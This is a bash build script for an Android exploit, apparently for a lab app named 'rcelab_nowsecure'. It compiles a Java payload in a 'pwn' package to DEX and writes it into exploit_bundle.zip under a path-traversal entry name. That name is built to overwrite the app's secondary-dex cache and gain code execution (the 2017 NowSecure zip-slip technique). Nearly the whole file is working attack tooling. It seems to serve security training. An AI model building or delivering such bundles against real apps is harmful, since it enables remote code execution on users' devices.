#!/bin/bash
set -e

echo "Building NowSecure 2017 exploit..."

ANDROID_HOME="${ANDROID_HOME:-$HOME/Library/Android/sdk}"

PLATFORM_PATH=$(find "$ANDROID_HOME/platforms" -type d -name "android-*" | head -n 1)
BUILD_TOOLS_PATH=$(ls -1 "$ANDROID_HOME/build-tools" | sort -V | tail -n 1 | xargs -I {} echo "$ANDROID_HOME/build-tools/{}")

ANDROID_JAR="$PLATFORM_PATH/android.jar"
D8="$BUILD_TOOLS_PATH/d8"

if [ ! -f "$ANDROID_JAR" ]; then
    echo "Error: Android SDK platform not found."
    exit 1
fi

if [ ! -f "$D8" ]; then
    echo "Error: d8 tool not found."
    exit 1
fi

rm -rf payload/bin exploit_bundle.zip

echo "Building payload..."
mkdir -p payload/bin
javac -source 1.8 -target 1.8 -cp "$ANDROID_JAR" -d payload/bin payload/src/pwn/*.java

echo "Creating DEX..."
cd payload/bin
# Compilar todas las clases del payload a DEX
"$D8" --lib "$ANDROID_JAR" --output . pwn/*.class

echo "Creating bundle..."
zip -q classes2.zip classes.dex

cd ../..

echo "[+] Creating exploit bundle with path traversal..."

python3 -c "
import zipfile

with zipfile.ZipFile('exploit_bundle.zip', 'w') as zf:
    # Inyectar el DEX malicioso con path traversal
    path_traversal_name = '../../../../data/data/com.app.lab.rcelab_nowsecure/code_cache/secondary-dexes/com.app.lab.rcelab_nowsecure-classes2.zip'
    zf.write('payload/bin/classes2.zip', path_traversal_name)
"

if [ -f exploit_bundle.zip ]; then
    SIZE=$(stat -f%z exploit_bundle.zip 2>/dev/null || stat -c%s exploit_bundle.zip)
    echo "Done: exploit_bundle.zip (${SIZE} bytes)"
else
    echo "Error: exploit_bundle.zip not created"
    exit 1
fi

